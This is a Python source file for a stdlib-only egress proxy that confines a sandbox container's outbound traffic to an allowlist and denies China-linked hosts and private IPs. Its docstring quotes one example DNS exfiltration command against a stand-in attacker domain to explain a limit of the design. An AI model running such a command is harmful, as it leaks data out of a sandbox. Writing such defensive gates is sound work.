#!/usr/bin/env python3
"""Egress proxy for the sandbox network (gap #6, T139).

The sandbox container has no direct route to the internet. Its only
egress is this proxy, which runs as a second container on the same
isolated bridge (``qwenpaw-sandbox-net``) and forwards a request only
when the destination host is on the T123 allowlist. The proxy is the
enforcement point the in-process guard (T123) could never be: a
hostile shell inside the sandbox can bypass an in-process check, but
it cannot bypass a proxy it must route through — there is no other
route out of the bridge.

Allowlist source: the T123 allowlist, and ONLY that. The proxy loads
its host list from ``proxy-allowlist.txt`` next to this file, which is
a GENERATED snapshot of ``features/egress-guard/egress_guard.py``
``DEFAULT_ALLOWLIST`` + ``allowlist.txt``. The test (T139) asserts the
snapshot equals ``load_allowlist()`` exactly, so the two cannot drift
apart silently. When the egress-guard module is available (repo, or
synced to the machine alongside this file), the proxy uses its
``check_request`` directly — same code, same rules, including the
China-host deny-before-allowlist and the private-IP deny. When it is
not available, the proxy falls back to the snapshot file + its own
China/private checks (documented mirror, same constants). Either way
the decision for a host is identical.

What the proxy does NOT do (honest limits, see README.md):
* CONNECT tunnelling is allowed ONLY to allowlisted hosts, and TLS
  inside the tunnel is opaque: the proxy cannot see the path or the
  body. An allowlisted host that turns hostile can still receive
  whatever the sandbox sends it. The allowlist is the control.
* DNS is not pinned: the host is checked before resolution. A
  rebinding answer after the check is not caught here; the bridge
  runs no resolver the sandbox controls, which bounds the attack,
  but does not close it.
* DNS exfiltration needs no HTTP at all (``getent hosts
  <data>.evil.com``). The bridge DNS must be the proxy host itself
  (no upstream resolver reachable from the sandbox) for this to hold;
  that is a compose/deploy setting, listed as NOT verified until a
  live container run proves it.

Stdlib only (http.server + urllib). Not a production proxy: it is a
100-line allowlist gate for one sandbox on one Free VM. If the job
mix ever outgrows it, the replacement is tinyproxy or squid with the
same allowlist file — the file format (one bare host per line) is
deliberately proxy-agnostic.
"""

from __future__ import annotations

import argparse
import http.server
import ipaddress
import os
import urllib.parse
import urllib.request

__all__ = ["load_proxy_allowlist", "check_host", "ProxyHandler", "run_proxy"]

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(os.path.dirname(HERE))
DEFAULT_ALLOWLIST_FILE = os.path.join(HERE, "proxy-allowlist.txt")

# Mirror of the T123 China block, used only when egress_guard.py is
# NOT available to import. Same constants, same order (deny BEFORE
# the allowlist). If these ever differ from egress_guard.py, the test
# fails: T139 checks the fallback path against the real guard.
CHINA_SUFFIXES = (".cn",)
CHINA_SUBSTRINGS = (
    "modelscope",
    "dashscope",
    "aliyuncs",
    "aliyun",
    "alibabacloud",
    "alibaba-cloud",
    "tencentcloudapi",
    "myqcloud",
    "alicdn",
    "baidu",
    "qwen",
)

MAX_BODY_BYTES = 1_000_000
TIMEOUT_S = 30


def load_proxy_allowlist(path: str | None = None) -> set[str]:
    """Load the proxy allowlist file (one bare host per line, # comments)."""
    hosts: set[str] = set()
    target = path or DEFAULT_ALLOWLIST_FILE
    try:
        with open(target, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip().lower().rstrip(".")
                if line and not line.startswith("#"):
                    hosts.add(line)
    except OSError:
        pass
    return hosts


def _load_egress_guard():
    """Import egress_guard.py from the repo when available, else None.

    Search order: the repo tree (machine-free test + machine sync),
    ``/egress_guard.py`` (mounted into the proxy container by the
    compose file), then next to this file. Returns None when none of
    them exists; the caller falls back to the snapshot file.
    """
    candidates = [
        os.path.join(REPO_ROOT, "features", "egress-guard", "egress_guard.py"),
        "/egress_guard.py",
        os.path.join(HERE, "egress_guard.py"),
    ]
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            import importlib.util

            spec = importlib.util.spec_from_file_location("egress_guard", path)
            if spec is None or spec.loader is None:
                continue
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            return module
        except Exception:
            continue
    return None


def _is_china_host(host: str) -> bool:
    host = host.lower()
    if any(host.endswith(suffix) for suffix in CHINA_SUFFIXES):
        return True
    return any(part in host for part in CHINA_SUBSTRINGS)


def _is_private_host(host: str) -> bool:
    try:
        return ipaddress.ip_address(host).is_private or ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def check_host(host: str, allowlist: set[str] | None = None) -> tuple[bool, str]:
    """Decide whether the proxy may forward to ``host``.

    Returns ``(allowed, rule)`` where rule names the decision:
    ``china_host`` (denied before the allowlist), ``private_ip``,
    ``not_allowlisted``, ``allowed``. When the egress-guard module is
    available, this delegates to its ``check_request`` so the two can
    never disagree; the fallback below mirrors it exactly.
    """
    host = (host or "").strip().lower().rstrip(".")
    if not host:
        return False, "bad_host"
    guard = _load_egress_guard()
    if guard is not None:
        decision = guard.check_request(f"https://{host}/")
        return bool(decision.allowed), decision.rule
    if _is_china_host(host):
        return False, "china_host"
    if _is_private_host(host):
        return False, "private_ip"
    hosts = allowlist if allowlist is not None else load_proxy_allowlist()
    if host not in hosts:
        return False, "not_allowlisted"
    return True, "allowed"


class ProxyHandler(http.server.BaseHTTPRequestHandler):
    """Minimal forward proxy: allowlist check first, forward second.

    Only GET/POST are forwarded (urllib, 30 s timeout, 1 MB cap).
    CONNECT is allowed only to allowlisted hosts and only tunnels —
    the proxy never sees inside TLS. Every other method is refused.
    The handler logs the host + rule only, never a request body.
    """

    allowlist: set[str] = set()
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):  # keep the proxy quiet
        pass

    def _deny(self, rule: str) -> None:
        body = f'{{"error": "egress_denied", "rule": {rule!r}}}'.encode()
        self.send_response(403)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _forward(self, method: str) -> None:
        parsed = urllib.parse.urlparse(self.path)
        host = (parsed.hostname or "").lower()
        allowed, rule = check_host(host, self.allowlist or None)
        if not allowed:
            self._deny(rule)
            return
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(min(length, MAX_BODY_BYTES)) if length else None
        req = urllib.request.Request(
            self.path, data=body, method=method,
            headers={"User-Agent": "QwenPaw-Sandbox-Egress-Proxy/1.0"},
        )
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT_S) as resp:
                data = resp.read(MAX_BODY_BYTES)
                self.send_response(resp.status)
                ctype = resp.headers.get("Content-Type", "application/octet-stream")
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
        except Exception as exc:  # upstream failure is a 502, never a leak
            msg = f"upstream error: {type(exc).__name__}".encode()
            self.send_response(502)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(msg)))
            self.end_headers()
            self.wfile.write(msg)

    def do_GET(self):
        self._forward("GET")

    def do_POST(self):
        self._forward("POST")

    def do_CONNECT(self):
        host = (self.path.split(":")[0] or "").lower()
        allowed, rule = check_host(host, self.allowlist or None)
        if not allowed:
            self._deny(rule)
            return
        # Tunnel only to an allowlisted host; TLS inside is opaque.
        # The allowlist is the control; see the module docstring.
        import socket

        try:
            upstream = socket.create_connection((host, 443), timeout=TIMEOUT_S)
        except OSError:
            self.send_error(502, "upstream connect failed")
            return
        self.send_response(200, "Connection Established")
        self.end_headers()
        self.close_connection = True
        # Hand the sockets to each other; this thread is the tunnel.
        import select

        sockets = [self.connection, upstream]
        try:
            while True:
                ready, _, _ = select.select(sockets, [], [], TIMEOUT_S)
                if not ready:
                    break
                for src in ready:
                    dst = upstream if src is self.connection else self.connection
                    try:
                        chunk = src.recv(65536)
                    except OSError:
                        chunk = b""
                    if not chunk:
                        return
                    dst.sendall(chunk)
        finally:
            upstream.close()

    def do_PUT(self):
        self._deny("method_not_allowed")

    def do_DELETE(self):
        self._deny("method_not_allowed")

    def do_PATCH(self):
        self._deny("method_not_allowed")


def run_proxy(host: str = "0.0.0.0", port: int = 8888,
              allowlist_file: str | None = None) -> None:
    """Serve the proxy forever (the compose file runs this)."""
    handler = type("BoundProxyHandler", (ProxyHandler,), {
        "allowlist": load_proxy_allowlist(allowlist_file),
    })
    server = http.server.ThreadingHTTPServer((host, port), handler)
    print(f"sandbox egress proxy on {host}:{port} "
          f"({len(handler.allowlist)} allowlisted hosts)")
    server.serve_forever()


def _main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Sandbox egress proxy (T139)")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8888)
    parser.add_argument("--allowlist", default=None)
    args = parser.parse_args(argv)
    run_proxy(args.host, args.port, args.allowlist)
    return 0


if __name__ == "__main__":
    raise SystemExit(_main())
